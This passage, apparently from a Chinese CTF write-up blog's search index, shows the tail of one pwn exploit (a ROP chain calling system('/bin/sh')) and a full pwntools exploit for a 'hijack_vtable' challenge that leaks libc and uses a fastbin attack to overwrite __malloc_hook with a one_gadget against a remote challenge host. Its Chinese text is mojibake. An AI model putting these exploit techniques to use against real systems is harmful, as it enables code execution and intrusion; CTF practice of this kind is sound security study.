class="number">0xebc88</span>]</span><br><span class="line">            payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x28</span> + p64(<span class="number">0x0000000000400462</span>) + p64(<span class="number">0x0000000000400661</span>) + p64(libc_base+<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))) + p64(libc_base+libc.sym.system)</span><br><span class="line">            sla(<span class="string">&#x27;&gt;&#x27;</span>,payload)</span><br><span class="line">            p.interactive()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">raise</span>(<span class="string">&#x27;ç¯å¢ƒæœ‰æ¯›ç—…&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br></pre></td></tr></table></figure>
<h2 id="hijack-vtable">hijack_vtable</h2>
<h3 id="åˆ†æ-4">åˆ†æ</h3>
<p>æ²¡å•¥å¥½åˆ†æçš„ï¼Œaddã€showã€deleteã€editéƒ½æ²¡é™åˆ¶ï¼Œç›´æ¥fastbin attackæ‰“malloc hook</p>
<h3 id="EXP-4">EXP</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#----------------function area start----------------#</span></span><br><span class="line">sla = <span class="keyword">lambda</span> ch,data:p.sendlineafter(ch,data)</span><br><span class="line">sda = <span class="keyword">lambda</span> ch,data:p.sendafter(ch,data)</span><br><span class="line">sd = <span class="keyword">lambda</span> data:p.send(data)</span><br><span class="line">sl = <span class="keyword">lambda</span> data:p.sendline(data)</span><br><span class="line">addr32 = <span class="keyword">lambda</span>:u32(p.recvuntil(<span class="string">b&quot;\xf7&quot;</span>)[-<span class="number">4</span>:])</span><br><span class="line">addr64 = <span class="keyword">lambda</span>:u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">lg = <span class="keyword">lambda</span> addr_name,addr:log.success(<span class="string">&quot;&#123;&#125; --&gt; &#123;&#125;&quot;</span>.<span class="built_in">format</span>(addr_name,<span class="built_in">hex</span>(addr)))</span><br><span class="line">ru = <span class="keyword">lambda</span> con:p.recvuntil(con)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">bp=<span class="number">0</span></span>):</span><br><span class="line">    gdb.attach(p,bp)</span><br><span class="line">    pause()</span><br><span class="line"><span class="comment">#----------------function area end------------------#</span></span><br><span class="line"><span class="comment"># p = process(&quot;./pwn&quot;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;125.70.243.22&#x27;</span>,<span class="string">&#x27;31986&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">choice</span>):</span><br><span class="line">    sla(<span class="string">&#x27;choice:&#x27;</span>,<span class="built_in">str</span>(choice))</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,size</span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    sla(<span class="string">&#x27;index&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    sla(<span class="string">&#x27;size&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">&#x27;index&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,<span class="built_in">len</span>,con</span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">&#x27;index&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    sla(<span class="string">&#x27;length:&#x27;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>))</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    sla(<span class="string">&#x27;content:&#x27;</span>,con)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    sla(<span class="string">&#x27;index&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x100</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x60</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">libc_base = addr64() - <span class="number">0x39bb78</span></span><br><span class="line">lg(<span class="string">&#x27;libc base&#x27;</span>,libc_base)</span><br><span class="line"></span><br><span class="line">malloc_hook = libc_base + libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x10</span>,p64(malloc_hook - <span class="number">0x23</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x100</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,<span class="number">0x30</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x13</span> + p64(libc_base + <span class="number">0xd5c07</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x10</span>)</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>å›½åŸæ¯</tag>
      </tags>
  </entry>
</search>
